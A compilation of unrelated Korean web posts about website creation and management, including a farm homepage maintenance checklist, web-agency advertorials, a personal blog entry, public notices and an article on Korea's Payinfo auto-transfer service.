반감) 이러한 디테일한 홈페이지관리를 통해서 쌓아진다고 볼 수 있겠습니다.  다음 홈페이지 관리방법은 홈페이지 방문자분석에 대해서 알아보겠습니다.    2. 홈페이지 관리계획가. 홈페이지 연간 운영계획 수립매년 홈페이지 운영계획을 수립·실천하고 연말평가를 통해서 개선할 것은 이듬해에 반영하고 개선한다.  나. 홈페이지 연중 운영계획(양식)1) 20XX년도 전자상거래 매출 목표  계 전자상거래 도매시장, 기타        2) 월별 온라인 마케팅 전략 및 홍보 계획  월별 마케팅 전략 홍보 계획 1     2     3     4     5     6     7     8     9     10     11     12     3) 소비자 체험프로그램 운영계획  시기 체험명 체험방법 및 내용        4) 소비자 약속 실천계획  소비자(단체)명 약속내용 실천계획       5) 다른 농가 홈페이지와 차별화 계획⦁⦁⦁6) 농가에서 소비자에게 줄 수 있는 서비스 상품⦁⦁⦁ 7) 새로운 상품 개발계획⦁⦁⦁ 다. 홈페이지 운영상태 점검⦁ 주기적으로 점검을 실시하고, 문제점은 즉시 조치한다.⦁ 점검주기는 일일점검, 월간점검, 분기점검, 연간점검으로 구분한다.⦁ 점검은 다음 점검표를 기준으로 실시한다. 1) 일일 점검표  항목 점검 사항 주문내역    결제시스템 시스템 정상작동 상태 상품 정보 효과, 효능 등 과대광고 부분 농장알림판(팝업창) 등록정보에 틀린 부분 (글자 받침 등이 없는지 확인) 묻고 답하기   포토갤러리   동영상    링크 상태 웹페이지별 정상 링크 여부 메일 확인   바이러스 및 악성 코드 감염    2) 월간 점검표  항목 점검 사항 웹서버 점검 시스템 취약성 점검 데이터 백업   저작권 이미지, 글씨체 저작권에 저촉되는 자료  3) 분기 점검표  항목 점검 사항 관리자 비밀번호 보안유지를 위하여 주기적으로 변경  4) 연간 점검표  항목 점검 사항 홈페이지 주소(도메인) 유효기간  보안접속(SSL)인증서 계약기간 결제시스템, 유지보수 계약기간  라. 홈페이지 이력 관리카드 관리⦁ 홈페이지 이력 관리카드는 족보나 마찬가지다.⦁ 홈페이지를 개발하여 사용하는 시점에 관리카드를 작성, 비치하여 활용한다.⦁ 이력 관리카드는 다음 양식을 농가에 맞게 변경해서 활용한 다. 홈페이지 이력 관리카드(양식)  농장주 이름   농장명   홈페이지 주소   사업장 주소   사업자등록번호   통신판매신고번호   결제대행회사 (PG사)   거래은행   결제계좌번호   결제방법 ∙ 카드( ) ∙ 계좌이체( ) ∙ 무통장( ) ∙ 에스크로( ) ∙ 소액결제( ) 홈페이지 개발 개발년도   개발회사   유지보수 회사명   계약기간 20 년 월 일 ~ 20 년 월 일( 년) 계약조건 : 20 년 월 일 ~ 20 년 월 일( 년) 계약조건 : 20 년 월 일 ~ 20 년 월 일( 년) 계약조건 : 20 년 월 일 ~ 20 년 월 일( 년) 계약조건 : 20 년 월 일 ~ 20 년 월 일( 년) 계약조건 : 주소(도메인) 관리 등록회사   ID   갱신현황   최초등록일   만료일   등록비   갱신일   만료일   등록비   갱신일   만료일   등록비   갱신일   만료일   등록비   갱신일   만료일   등록비    ⦁ 변동사항  날짜 내용 비고                                                 ​ 안녕 하세요?친구에게 홈페이지 관리와 블러그 포스팅을부탁 받았어요네이버에서 모두엣 무료교육 한번 받았는데모바일홈페이지 만들기 시도 하고 있어요공장 사무실에서 열심히 만들다가배가 고파 시간을 보니 5시가 넘었네요아점 먹고 와서 그런가봐요친구는 연말 모임있어 좀 일찍 강남가고다른 직원들 모두 저녁약속있네요혼자 짬뽕 먹었어요친구 공장 옆에 있는 짬뽕 전문 집인데둘이 가끔가서 먹는데 맛이 괜찮아요오늘은 혼자 갔네요짬뽕 다 먹었는데 딸램퇴근한다고 전화와서돈까스 먹고 싶다고돈까스집 폭풍검색 해서 찾아갔네요히레까스하고  냉모밀시켜서 혼자 다 먹네요딸램도 배가 많이 고팠나봐요디져트로 이데아 가서 아이스 아메리카노와핫 아메리카노 각각 한잔씩 뚝딱 했어요근데 돈까스집 사진이 하나도 없어요깜빡헤헤요건 친구 공장에서 만든 기모 특양면후드 티 인데요 심슨아저씨 자수 놓아 진거예요귀여워서 찍어왔어요코엑스 행사때 만들어서 엄청 많이 팔았던 거여요가볍고 포근해서 어른 아이 다 좋아 하드라구요에휴 이러다 12시 넘겠어요이웃님들 오늘도 수고 많으셨어요편한밤되세요~~^^모바일 홈페이지 만드는것 또 해 봐야 해요아시는분들 조언 부탁 드려요~~♡~~​ ​최근들어 모바일시장이 지속적으로 업그레이드되고 발전됨에 따라 자연스레 홈페이지제작에 대한 이슈도 많이 생기는거 같아요. 특히나 반응형홈페이지제작의 경우에는 업체에 따라서 필요한 부분이기 때문에 초보자들은한번쯤 체크해야할 필요성이 많은거 같습니다.쉽게말해 홈페이지의 사이즈 및 크기가 줄었다 늘었다 하는것으로 말하는게 반응형홈페이지제작입니다.접속자의 화면 크기에 반응한다고 하여 이렇게 정의를 내리는데 무조건 좋은거라고 볼 수는 없습니다. ​ ​예전에 회사에서 기업홈페이지제작을 진행한적이 있었는데, 그당시 업체에서 PC 및 모바일을 따로 할껀지물어보더군요. 통상적으로 모바일 홈페이지의 경우 단순히 화면 자체를 작게 만들고 내용을 간소화하여 만드는경우가 많다고 들었습니다. 그렇다보니 정작 중요한 내용을 볼려면 PC버전의 사이트로 접속해야한다던지 효율적인 측면에서 상당히 별로였던게 기억나네요.​ ​또한 모바일과 PC홈페이지를 각각 관리해야하는 유지비용 측면에서도 비효율적이였고, 사실 초보자인경우에는 이 2가지를 같이 관리한다는게 말도 안되는 부분인지라 이러한 부분때문에 반응형홈페이지제작을 찾는 클라이언트들도 많이 있었던게 사실입니다.태블릿을 이용하는 이용자들도 많기 때문에 모바일 홈페이지를 접속하게되면 불편을 초래하는 경우도 많아서 저는 반응형웹사이트를 선호하는편입니다.​ ​솔직하게 말해서 반응형홈페이지가 특별히 기술을 요구하는건 사실 아니기 때문에,대부분의 홈페이지제작업체에서는 잘만드는 편입니다. html을 만들면서 통상 css파일을 만드는 과정에 반응형을 지원하는 부분이기 때문에 속성이 어느정도 추가되었다고 생각하시면 쉽습니다. 반응형 웹 개발이 워낙 잘 알려져있기 때문에 대부분의 홈페이지 자작업체에서는 다룰줄 알기 때문에 너무 걱정안하셔도 됩니다. ​ ​예전엔느 모니터에 맞춰 1024x768 , 1280x960등 동일한 비율에 맞춰서 대응하였지만, 이제는 다양한 모바일환경 및 비율 해상도가 달라졌음은 물론 디바이스 픽셀 크기 자체가 비교도 안될 만큼 작은 경우도 많다고 합니다.그렇다보니 페이지 설계할 부분에 있어서 고려해야할 여러가지 사항들이 많이 존재한다고 합니다.​ ​솔직하게 홈페이지제작업체를 알아볼 때 대부분 저렴한 금액으로 홍보를 하는 업체가 많은데, 정작 진행하다보면 비용이 더 늘어나게 되더군요. 최소 페이지에 맞춘 가격이라고 얘기하면서 슬며시 비용 추가금액을 안내하고, 초기 제안받았던 제작비용보다 2배이상 올라가버리는 꼴이 되니 어이가 없어서 홈페이지제작업체를 잘 골라야겠구나 생각이 들어서 많이 알아보고 다니긴 했습니다.​ ​그와중에 반응형홈페이지제작과 관련하여 희명웹을 만나게 되었는데, 당시 담당자분이 지금도 계실지 모르겠지만 상당히 안내와 소개를 잘해주셔서 그 당시 웹사이트제작에필요한 전반적인 안내와 함께 현재까지 유지보수를 맡기고 있는 업체이기도 합니다. 경력자위주로 구성된 업체라고 해서 실제로 방문까지 해서 미팅을 하였는데 체계적으로 담당팀들이 분류화되어 있어서 기획자분과 디자이너분이 미팅에 참여하셔서 저희가 만들고자 했던 사이트에 대하여 피드백과 제안을 잘해주신 기억이 아직까지도 남아있네요. ​ ​또한 호스팅과 도메인서버를 제공받았고, 초기에 디자인 시안을 받을때 시안을 상당히 잘뽑아주셔서 최종결과물까지 디자인적 측면에서는 내부 회의결과 대부분 만족도가 높아서 수정이 거의 없을정도로 업무가 빠르게 진행되었던게 너무 괜찮았습니다. 기능적인면에서 개발해야할 부분이 없었기에 약 13페이지 분량의 기업형 엡사이트를 의뢰하였고, 그외 게시판 일부에 카톡링크정도 의뢰드렸었는데 현재까지 내부적으로 웹사이트 관리 및 운영에 있어서 불편함이 없네요.  ​물론 웹사이트라는게 유입이 정말 중요한 부분인데, 희명웹의 경우 다양한 브랜드를 보유하고 있는 업체다보니마케팅팀을 별도로 소개해주셔서 저희 홈페이지에 필요한 SEO작업과 더불어 검색광고 세팅까지 모두 지원을 해주셔서 유입도 적절히 나오고 B2B영업을 목적으로 만든 사이트라 어떻게 하면 홍보효과를 줄 수 있을지에 대해서는 내부적으로 컨설팅도 받았습니다.​ ​아낌없이 쓸건 쓰자는 주의라 홈페이지제작에 있어서 비용을 아끼면 그만큼 퀄리티도 떨어지기 때문에 적은비용에 너무 현혹되지 마시고 제대로 된 업체를 선정하는게 필요하지 않나 싶습니다.특히나 홈페이지제작 이후에 유지보수측면에서 업체에 대한 믿음이 중요하고 최근들어 폐업되는 웹에이전시들도 많기 때문에 필히 오래갈 수 있는 웹사이트제작업체를 선정하는게 지혜로운 판단일 꺼 같아 이렇게 안내드려봅니다.​ ​수백개의 홈페이지제작업체가 있는데, 진입장벽이 워낙 낮고, 비대면 서비스가 최근들어 많기 때문에 업체와 미팅이 쉽지 않지만 희명웹은 상황에 따라 줌 화상채팅이 가능하다고 하니 이부분도 고려해서 업체컨택을 해보시는게 좋을 듯 싶어요.다양한 웹레퍼런스를 보유한 희명웹은 담당자별로 각기 파트별 리더들이 있어서 안내와 함께 전문성이있는 서비스를 받을 수 있으니 한번쯤 상담받아보시는것도 좋지 않을까 생각됩니다. ​ ​적은비용으로 반응형홈페이지제작을 제작해주겠다는 업체에 너무 속지 마시고, 업력과 포트폴리오는 기본적으로 체크하되 어던 담당자를 만나는지가 정말 웹사이트 성패를 좌우하는 만큼 충분히 업체 고객센터를 통해 유선상담을 받아보시고 느낌이 괜찮은 업체를 선정하는게 좋을듯 싶네요. ​ www.hmweb.kr 홈페이지제작업체 희명웹ㅣ홈페이지제작,쇼핑몰제작,반응형홈페이지제작업체웹사이트제작,반응형홈페이지제작,기업홈페이지제작,쇼핑몰홈페이지제작,사이트제작,반응형웹,홈페이지제작비용,쇼핑몰제작업체www.hmweb.kr #반응형홈페이지제작 #희명웹​[본 포스팅은 업체로부터 소정의 원고료를 지원받아 작성되었습니다.] 네이버 블로그는 맞지만, 확인불가1년 365일 고객을 기다리는 홈페이지,영업의 첨병이죠.어떤 고객이 방문했는지? 어디를 통해서 방문했는지?방문한 고객이 어떤 생각을 하고 있는지?모니터링을 하는 것은 영업전략을 준비하는데 중요한 요소입니다. 매일매일 시장상황은 달라지기 마련이고,고객의 요구사항도 바뀌죠.스마트폰 시대에 홈페이지는 더욱 고객과 밀접한 요소로 자리매김 하고 있습니다.어떤 업종이든지 홈페이지는 홍보에 있어서 중요도 우선순위가 높습니다.고객을 만나서 홈페이지 내용을 안내해드리거나,계약관련자료,PPT,제안서,기술안내서 등 홈페이지를 통해 다운로드 받을 수 있도록 하는 것도 중요합니다.월 일정 비용으로 홈페이지관리를 의뢰하는 기업이 늘고 있습니다.그러나, 매일 작성되고 변화되는 대 고객 자료를 업데이트하는 기업은 많지 않습니다. '네이버' 또한 하나의 홈페이지에 불과합니다. 단지 효용성이 일반 기업의 홈페이지보다 높을 뿐이죠.그린서포터즈(speed365.co.kr) 는 홈페이지 관리 고객사의 홈페이지를 매체화시키는데 도움을 드리고 있습니다.월 일정액의 관리약정만으로 인터넷 시대를 선도할 수 있는 기업이 되실 수 있습니다. 블로그를 운영하신다면, 더욱 이롭습니다. 블로그 글을 홈페이지에 담아보세요..참고 사이트 running-mate.co.krsimonsports.co.krhttp://easy.speed365.co.kr이지홈페이지제작관리센터홈페이지 전문 제작 관리 업체, 반응형 홈페이지 솔루션 제작 상담 및 접수easy.speed365.co.kr홈페이지서 블로그로, 또는 블로그에서 홈페이지로 자유롭게 고객의 이동을 실현해보세요.인터넷 세상에서 주인공이 되시는 일, 그린서포터즈에서 도와드리겠습니다. 지금 연락주세요.e-mail : master@speed365.co.kr연락처 : 02-525-1365카카오톡ID : greensupporters위치 : 서초구 서운로 13 중앙로얄오피스텔 112홈페이지 정기 관리 문의 :02-525-1365e-mail : master@speed365.co.kr서울시 마을공동체 종합지원센터 홈페이지 내 관리시스템 사용자 매뉴얼입니다.공모사업 접수 방법, 제안서 수정방법, 실행계획서 등록방법, 결과보고서 등록 방법이 안내되어 있으니 다운로드 받으셔서 참고하세요. ​시스템 이용시 오류나 문의는 서울시 마을공동체종 합지원센터  02)385-2642 로 문의하세요.  ​​ 첨부파일2020_관리시스템 사용자 매뉴얼.pdf파일 다운로드 ※파일첨부2020_관리시스템 사용자 매뉴얼​#서울시육아공동체활성지원사업 #서울시육아공동체 #공동육아지원사업 #품앗이공동육아 #공동육아 #증빙서류 #참고서식 #서마종홈페이지 #관리시스템사용자매뉴얼   ​   메이크홈즈 깨알 팁! 홈페이지제작및관리홈페이지 제작 및 관리 시 체크사항 관련 이야기 이렇게 흥미로웠나?     정보를 보면 뇌세포가 자극되고 뇌가 균형을 잡게 된다고 합니다.바로 제가 마련한 홈페이지제작및관리에 대한 정보를 보면여러분의 뇌가 분명히 자극될 것 같은데요~? 여러분의 신경에 도끼가 되어줄 홈페이지제작및관리에 관한 정보! 꼭 기억하세요.홈페이지 만든 후에는 링크나 맞춤법 등을 보는 것이 좋습니다.잘못된 링크가 없는지, 오타나 틀린 맞춤법은 없는지 확인하여 오픈을 하는 것이 이상적입니다.​마케팅은 홈페이지 제작 시 검토해야 하는 꼭 필요한 요소에 해당됩니다.버튼, 아이콘, 링크 등 고객의 행위를 이끄는 장치들에 마케팅 역할을 부여해야 하죠.​홈페이지 메인화면은 간단한 형태로 사이트의 내용을 압축해서 보여주어야 합니다.무엇보다도 메인페이지만 봐도 홈페이지의 필수적인 내용을 알 수 있게 정확한 의미를 전달해야 해요.​도메인은 홈페이지 제작 시 필히 확인해야 하는 사항입니다.짧고 외우기 쉬운 도메인이 좋으며 도메인에 업종이나 제품의 키워드를 포함하는 것이 좋아요.특히 최상위의 도메인은 .com이나 co.kr을 사용하는 것이 외우기에 간단합니다.​   홈페이지의 콘텐츠는 어렵지 않은 문장으로 딱 맞게 정보를 전달해야 합니다.대충 훑어봐도 전부 이해가 가능할 정도로 심플하고 임팩트 있게 구성하는 것이 좋죠.​   ​   모두 주목하세요! 홈페이지 제작 및 관리 비용 줄이는 방법에 관한 필수 정보 대방출     마음에 드는 레이아웃과 컨셉이 있다면 맞춤형 홈페이지 제작업체에 요청하는 것도홈페이지 제작 비용을 감소시키는데 효과적입니다.그뿐 아니라, 제작완료 후 레이아웃 수정 시 추가비용이 들 수 있기 때문에 완성 전 디자인 시안을 빠짐없이 확인하는 것이 좋습니다.​홈페이지 제작 후에는 지속적인 관리를 위해 도메인, 호스팅, 검색엔진을 등록해야 합니다.보통 1년 단위로 등록해야 하기 때문에 매년 관리 비용이 발생하게 되죠.이러한 등록비용을 무상으로 제공해주는 업체를 쓰면, 홈페이지 관리 비용을 줄일 수 있어요.​템플릿홈페이지 제작업체를 통해서 하면 비용을 절감하는 효과를 볼 수 있습니다.업체에서 주는 디자인 시안 중 마음에 드는 디자인을 선택하여 업종에 맞게 변경 제작하면제작기간이 단기간인 만큼 금액이 저렴하면서도 만족도가 높은 편입니다.​홈페이지 내용을 정정해야 할 경우, 수정 페이지당 편집 비용이 생기게 됩니다.관리 비용을 아끼기 위해 최초 제작비용 견적 시 페이지 편집 건수가 서비스로 구성되어 있는 지 고려하며, 견적 비교 후 제작을 문의하는 것이 좋습니다.   최근 스마트기기 많아지면서 스크린의 해상도 또한 다양해지고 있어요.홈페이지는 스크린 넓이에 따라 피씨, 모바일, 반응형 홈페이지로 분류됩니다.반응형 웹사이트로 홈페이지를 제작 한다면 화면 크기나 해상도에 상관없이사이트를 구성할 수 있기 때문에 추가적인 제작비용을 아낄 수 있습니다.​   우리 가게를 더 쉽게, 더 효율적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 수준의 로고와 홈페이지를 제작해주는 메이크홈즈가 도와 드릴게요!​업체의 상품과 서비스를 세세하게 분석해 더 보기 쉽게, 더 흥미가 일도록 제작하는 곳!인스타그램 등 SNS를 활용한 다양한 광고마케팅도 시행하여 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 낮은 견적으로 고객님의 마케팅 비용은 낮춰주고!신속정확한 일처리 및 지속적인 피드백으로 홈페이지 제작 및 광고마케팅 만족도는 높여주고!​지금 바로 메이크홈즈에 전화해 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!홈페이지 제작 문의 전화 052-267-2027/ 010-3063-7993   오늘도 홈페이지제작및관리 관련 정보를 통하여 한층 더 성장한 당신께 박수를 보냅니다!오늘 같은 소소한 노력이 모이면 뿌듯한 결과물을 만들어낼 수 있을 것이라 확신합니다~더 알찬 내용으로 인사할 때까지 오늘 공부한 홈페이지제작및관리 관련 내용 잊지 말아 주세요!   ​​ 중앙선거관리위원회 모바일 홈페이지 개편 오픈 이벤트 중앙선거관리위원회 모바일 홈페이지가 새롭게 태어났습니다!개편된 모바일 홈페이지에서는 원스톱(One Stop) 선거정보로 다양한 정보를 확인하실 수 있는데요. 쉽고 편리해진 모바일 홈페이지도 확인하시고 준비한 퀴즈 이벤트에도 참여해보세요! 퀴즈에 응모해주신 선착순 4,000분께 선물을 드립니다!* 본 이벤트는 스마트폰 등 모바일 기기를 이용하여 참여해 주시기 바랍니다. "지금 중앙선관위 모바일 홈페이지로 접속하세요!" ▶ 모바일 홈페이지 이동하기 -----------------------------------------------여러분께서 보내주신 뜨거운 성원에 힘입어 모바일 홈페이지 개편 오픈 이벤트 선착순이 마감되었습니다.보내주신 관심에 진심으로 감사드리며, 앞으로도 중앙선거관리위원회에 많은 관심 부탁드립니다!  ※이벤트 문의 : 02-3482-2004(내선번호325) <중앙선거관리위원회 미디어과>  네이버 블로그는 맞지만, 확인불가  안녕하세요! 금융감독원 대학생 기자단 11기 고예슬 기자입니다.날씨가 점점 더워지고 있는데, 여름에 잘 대비하고 계신가요?오늘은 제가 햇볕이 쨍쨍한 여름 날에 땀 흘리며 은행을 찾아가지 않고도나의 계좌와 연결되어있는 자동이체를 조회하고 해지할 수 있는 방법을 알려드리겠습니다!<출처: 금융감독원>2014년 한해동안 우리나라에서 자동이체된 금액은 799.8조원으로 건수로는 26.1억건에 달합니다.국민 1인당 월평균 이체 건수는 8건, 건당 평균 이체 금액은 31만원으로 추정되는 등국민 경제 생활에서 자동이체 서비스는 빈번하게 사용됩니다.저같은 경우도 기부나 적금, 통신비 등이 매월 자동이체를 통해 납부되고 있습니다.국민 1인당 월평균 자동이체 건수가 9건인 영국과 호주의 경우는 금융소비자의 금융사 선택권을 보장하기 위해  거래하던 예금계좌를 다른 은행으로 옮기면 별도의 신청 없이도 공과금, 통신비, 급여 등의 이체 거래가 자동 이전되는 계좌이동제가 이미 시행중에 있습니다.그래서 우리나라의 경우에도 2016년 전면 도입예정인 계좌이동제도의 토대를 마련하기 위하여 2015년 7월부터  자동이체 통합관리 서비스가 실시되었습니다.저와 함께 자동이체 통합관리 서비스가 어떤 서비스이고 어떻게 이용하는지 알아보러 가실까요?    자동이체 통합관리 서비스란?  2015년 7월 1일(수)부터 자동이체 통합관리 홈페이지(Payinfo)가 개설되었습니다. 자동이체 통합관리 서비스란, 본인 명의의 예금계좌에 등록되어있는 자동이체 신청내역을 일괄적으로 조회·해지하거나, 다른 계좌로 변경할 수 있는 서비스입니다. Payinfo는 세계 최초의 금융회사 통합인프라로, 우리나라 국민이라면 누구나 별도의 회원가입이나 비용 부담없이 공인인증서만으로 이용이 가능합니다.  지금까지는 본인의 주거래 은행을 변경하기 위해서, 자동이체 출금계좌를 요금청구기관(카드, 보험, 통신사 등)을 찾아가 하나 하나 해지하고 새로 등록해야해서 매우 번거롭고 귀찮았습니다. 또한 요금청구기관과의 계약이 종료된 이후에도 자동이체가 해지되지 않은 경우가 있어 고객 스스로도 본인의 자동이체 등록 현황 등을 항상 신경쓰고 있어야 했습니다. 이러한 불편함을 개선하고 고객의 자산관리의 안정성과 편의성을 제고하기 위해 금감원은 은행권과 공동으로 자동이체 통합관리 서비스를 제공하기로 하였습니다. 이제부터는 자동이체 내역을 한 눈에 파악할 수 있고, 불필요한 자동이체를 클릭 몇번으로 손쉽게 해지할 수 있습니다.   이용방법은? 자동이체 통합관리 서비스 홈페이지(www.payinfo.or.kr)에서 관련 서비스를 제공하고 있습니다. 자동이체 내역 조회 서비스는 매일 9:00~22:00까지 가능하며, 해지 서비스는 매 영업일 9:00~17:00까지 이용하실 수 있습니다. 서비스 이용을 위해서는 보안 프로그램을 설치해야하며, 본인 명의의 공인인증서가 준비되어 있어야 합니다. 내역 조회를 하시면 통신비, 보험료, 신용카드 대금 등 요금청구기관에 자동이체 신청내역이 나타나게 됩니다.* 2015.7.1 기준 이용 가능한 금융회사- 조회서비스: 52개 금융회사(경남은행, 광주은행, 국민은행, 기업은행, 농협은행, 농협중앙회, 대구은행, 부산은행, 산업은행, 수협은행, 수협중앙회, 신한은행, 외환은행, 우리은행, 전북은행, SC은행,  제주은행, 하나은행, 한국씨디은행, 우체국, 새마을금고, 신협중앙회, 상호저축중앙회, 산림조합중앙회, 뱅크오브아메리카, 도이치은행, 중국공상은행, JP모건체이스, HSBC은행, 교보증권, 대신증권, 대우증권, 동부증권, 메리츠종금증권, 미래에셋증권, 부국증권, 삼성증권, 신영증권, 신한금융투자, 아이엠투자증권, 유안타증권, 이베스트투자증권, 키움증권, 하나대투증권, 하이투자증권, 한국투자증권, 한화투자증권, 현대증권, HMC투자증권, LIG투자증권, NH투자증권, SK증권)- 해지서비스: 25개 금융회사 (경남은행, 광주은행, 국민은행, 기업은행, 농협은행, 농협중앙회, 대구은행, 부산은행, 산업은행, 수협은행, 수협중앙회, 신한은행, 외환은행, 우리은행, 전북은행, SC은행, 제주은행, 하나은행, 한국씨티은행, 산림조합중앙회, 새마을금고, 한국투자증권, 유진투자증권, 미래에셋증권, 교보증권)   제가 한 번 이용해 보겠습니다...! 홈페이지(www.payinfo.or.kr)로 들어가시면 아래와 같은 메인 화면이 나타납니다. 서비스에 대한 안내와 질의응답 등의 서비스도 함께 제공되고 있습니다.                  향후 서비스 계획 현재는 시작단계로 자동이체 연결 계좌 일괄 조회와 해지 서비스만 제공하고 있습니다. 그러나 2016년 6월까지 단계적으로 자동이체 조회·해지·변경 서비스로 확대하고 요금청구기관도 전체로 확대할 계획입니다. 또한 개인간 자동송금에 대한 내역 조회·해지·변경도 2016년 2월부터 제공할 예정입니다. 인터넷 이용이 어려운 고객을 위해서 내년 2월부터는 전국의 모든 은행 지점에서 동 서비스를 이용할 수 있습니다. 그리고 현재는 학교 스쿨뱅킹이나 아파트 관리비 등 일부 내역이 포함되지 않고 조회되고 있지만, 전산 개발 일정에 따라 순차적으로 서비스 범위를 확대해 나갈 계획입니다. Payinfo가 안정적으로 구축되고 나면, 「계좌이동서비스」로 서비스 고도화를 추진할 계획입니다. 현재는 서비스 시행 초기 단계이기때문에 활성화보다 시스템 안정화에 목표를 두고 있습니다. 자세한 일정은 아래의 일정표를 보시면 될 것같습니다! 제 기사를 보시면서 독자분들께서도 꼭 한 번 자동이체 내역을 조회해보시길 바랍니다!저도 기사를 작성하면서 해지되었던 카드에 자동이체가 남아있다는 것을 알게되었습니다.홈페이지에서 해지까지 바로 가능하니, 많은 분들께서 유용하게 이용하셨으면 좋겠습니다.향후에는 자동이체 계좌 변경과 자동 송금 내역까지 볼 수 있다고하니 더욱 기대가 되는 서비스입니다!지금까지 금나반 11기 고예슬 기자였습니다. 감사합니다! < 참고자료 >금융감독원 보도자료 '7월 1일부터 자동이체 통합관리 홈페이지(Payinfo)에서 자동납부 연결계좌를 한눈에 조회-해지하실 수 있습니다' ※ 본 게시물은 금감원 대학생 기자단(금나반)의 기사로서 금감원의 공식입장과 다를 수 있음을 알려드립니다.> 더 보기└ 접기 ​​이번 포스팅은 홈페이지 제작 업체와의 장기 계약에 대한 주제로말씀드리겠습니다.​홈페이지 제작 시 꼭 체크하세요. 절대 장기 계약은 하지 마세요. 장기계약을 하면 안 되는 이유는 두 가지를 말씀드리겠습니다. ​첫 번째, 홈페이지 제작업체는 쉽게 무너집니다. 두 번째, 계약 전과 계약 후의 태도가 달라질 수 있습니다. ​ 그럼 먼저 첫 번째부터 말씀드리겠습니다.  첫 번째, 홈페이지 제작업체는 쉽게 무너집니다. ​대마불사(大馬不死) "큰 말은 쉽게 죽지 않는다" 라는 뜻으로 반드시 살 길이 생긴다는 의미입니다. ​대기업은 아무리 큰 적자를 내더라도 쉽게 죽지가 않지만 홈페이지 업체는 아닙니다. ​홈페이지 제작 업체 중에는 대기업이 없습니다. 정말 하루하루 폐업하는 홈페이지 제작 업체가 속출하고 있습니다.  ​게다가 지금과 같은 어려운 경제상황 속에서는 툭하고 치면 와르르 무너지는 제작업체가 대부분입니다. ​그리고 나의 홈페이지를 관리하고 있는 업체가 사라지면 홈페이지의 존속 여부도 불투명해집니다. ​따라서 3년 치 사용료를 한꺼번에 내야 하는 장기계약은 절대 하시면 안 되겠습니다. ​문의 전화가 가끔씩 옵니다.  내후년까지 사용료를 미리 납부해놨는데 어느 날 홈페이지가 열리지가 않고 홈페이지를 관리하던 업체가 연락이 안 됩니다. 계약서는 가지고 있는데 어떻게 해야 하나요? 죄송하지만 방법이 없습니다. 지금 상황에서는 사용료를 얼마나 내셨는지, 계약서에 어떻게 적혀있는지는 중요하지 않습니다. ​홈페이지가 열리지 않고, 이를 관리하는 회사는 연락이 안된다는 게 중요하죠. ​너무 안타깝습니다. 방법이 없습니다.   그럼 장기 계약은 하지 말아야 하는  두 번째 이유를 말씀드리겠습니다.  ​계약 전과 계약 후, 제작사의 태도가 달라질 수 있습니다. ​계약 전에는 아마도 영업사원과 소통을 많이 했을 것입니다. 영업사원의 목적은 계약을 따내는 것이죠. ​계약 후에는 업무 담당자와 통화를 주로 할 것입니다. 예상과는 다른 반응에 좀 실망하실 수도 있는 일이 생길 수가 있다는 것이죠. 그리고 계약을 했던 영업사원과 통화를 하더라도 그 사원조차 태도가 달라져있을 수 있습니다. ​ ​지금은 계약 후니까요. ​물론 계약 후에도 좋은 관계가 계속 유지되면 좋죠. 근데 아닐 수도 있으니까요. ​따라서 영업사원을 믿고, 무작정 홈페이지 제작 업체와 장기계약을 하는 일은 없으면 좋겠습니다.  계약기간을 얼마나 해야 하는지 정답은 없습니다.  짧게 하면 좋겠지만 매달 계약하는 것도 부담스럽고 번거로울 수 있고 길게 하자니 좀 불안하고... ​이럴 때는 무작정 홈페이지 제작 업체 입장에 따라 계약기간을 정하지 마시고 업체 상황에 따라 감당할 수 있는 6개월 혹은 1년으로 계약하시는 것이 좋을 것 같습니다.​​오늘 포스팅은 여기까지 입니다.​그럼 다음 포스팅으로 다시 인사드리겠습니다.감사합니다.​​홈페이지 제작 의뢰시 참고할 포스팅을 정리하였습니다.https://blog.naver.com/kty4523/222363694445 홈페이지 제작 의뢰시 참고할 포스팅을 정리하였습니다.★ 홈페이지 기본 상식 ★ 독립형 홈페이지와 임대형 홈페이지의 차이점을 알려드립니다. https://blog.nav...blog.naver.com ​ 플래시 홈페이지 수정 (홈페이지 유지보수)​웹브라우저 및 컴퓨터 사용시 많이 이용했었던 어도비의 플래시 플레이어가 보안상 문제로 2020년 12월 31일 이후 플래시 프레이어 지원을 중단했습니다. ​그래서 플래시를 사용한 홈페이지에서는 화면이 보이지 않는 문제가 발생되며, 스마트폰으로 홈페이지를 접속해서 볼때도 역시 화면이 보이지 않는 문제가 발생됩니다. 이럴 경우는 사용자가 홈페이지를 접속하더라도 내용 확인이 불가능하고 메뉴를 플래시로 사용하는 경우 원하는 페이지로 이동이 불가능합니다. ​그에 대한 해결책으로 플래시 사용된 영역만 이미지+스크립트형태로 수정해서 홈페이지를 정삭적으로 다시 사용하실 수 있습니다.​ 플래시가 적용되어있는 홈페이지플래시를 이미지 + 폰트 + 스크립트로 교체한 홈페이지​1. 메뉴 영역 : 폰트(텍스트) + 스크립트를 이용해서 교체 ​2. 메인이미지 영역 : 이미지 + 슬라이드 스크립트 + 게시물 추출 프로그램을 이용해서 교체​3. 배너영역 : 이미지 + 슬라이드 스크립트를 이용해서 교체 ​4. 배너영역 : 이미지 + 슬라이드 스크립트를 이용해서 교체 ​이런 방법으로 홈페이지를 수정해서 다시 정상적으로  홈페이지를 사용할 수 있도록해드렸습니다.​​#플래시수정 #플래시교체 #홈페이지수정 #홈페이지플래시수정 #홈페이지플래시교체 #프로그램수정 #홈페이지관리 #홈페이지유지보수 #홈페이지유지관리​​수정문의 : 055-282-4456​​ ​​전체 포트폴리오 보기#김해홈페이지제작 #진주홈페이지제작 #창원홈페이지제작 #부산홈페이지제작 #홈페이지유지보수 #쇼핑몰유지보수 #유지관리#프로그램제작 #프로그램관리 #프로그램유지보수 #웹에이젼시 #창원웹에이젼시 #창원디자인​#homepage : ​http://www.wizad.co.kr​​​ 홈페이지관리업체 선정기준 3가지?홈페이지관리업체 선정기준에 대해 알아봅니다​요즘은 온라인을 통해 홍보, 영업 등의 일을 진행하는 시대라고 볼 수 있습니다.온라인을 통해 홍보 및 영업을 하는 마케팅 업무는 소셜네트워크 시스템을 통해서 많이 하는 것을 볼 수 있습니다. ​​​​하지만 회사를 소개하거나 특징과 개성을 사람들에게 소개하는 가장 좋은 방법은 홈페이지를 이용하여 어필하는 것이 가장 효과적인 방법이라 할 수있습니다.그러므로 오늘은 이러한 홍보 및 영업 등의 마케팅효과를 톡톡히 볼 수 있는 회사홈페이지를 관리하는홈페이지관리업체 3가지 선정기준을 알려드리도록 하겠습니다.​​​먼저, 해당 업체가 